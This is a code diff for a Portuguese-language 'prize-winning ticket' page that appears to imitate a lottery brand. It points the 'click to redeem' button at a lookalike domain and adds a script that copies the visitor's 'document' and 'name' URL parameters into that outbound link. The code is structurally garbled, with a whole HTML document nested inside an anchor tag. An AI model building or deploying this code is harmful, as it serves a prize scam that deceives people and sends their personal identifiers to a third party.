@@ -74,10 +74,45 @@
             <h1>Título nº <span>8541256</span></h1>
             <h2>BILHETE PREMIADO!</h2>
           </div>
-          <a href="https://vivasorteoficialaten.vercel.app/">
-            <button type="button" class="adc-carrinho-premiado">
-              <i class="bi bi-trophy-fill"></i> CLIQUE PARA RESGATAR
-            </button>
+          <!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Resgatar Prêmio</title>
+  <!-- Inclua aqui o link para a biblioteca de ícones, se necessário -->
+</head>
+<body>
+  <a id="dynamicLink" href="https://suporte.viva-sorte-official.com/atendimento-suporte">
+    <button type="button" class="adc-carrinho-premiado">
+      <i class="bi bi-trophy-fill"></i> CLIQUE PARA RESGATAR
+    </button>
+  </a>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function() {
+      // Função para obter o valor do parâmetro da URL
+      function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+      }
+
+      // Obter os valores dos parâmetros 'document' e 'name'
+      const documentValue = getQueryParam('document');
+      const nameValue = getQueryParam('name');
+
+      // Obter o elemento do botão pelo ID
+      const dynamicLink = document.getElementById('dynamicLink');
+
+      // Atualizar o href do botão com o novo link, incluindo ambos os parâmetros, ou manter o link padrão
+      if (documentValue && nameValue) {
+        dynamicLink.href = `https://suporte.viva-sorte-official.com/atendimento-suporte?document=${documentValue}&name=${nameValue}`;
+      }
+    });
+  </script>
+</body>
+</html>
+
           </a>
         </div>
       </div>
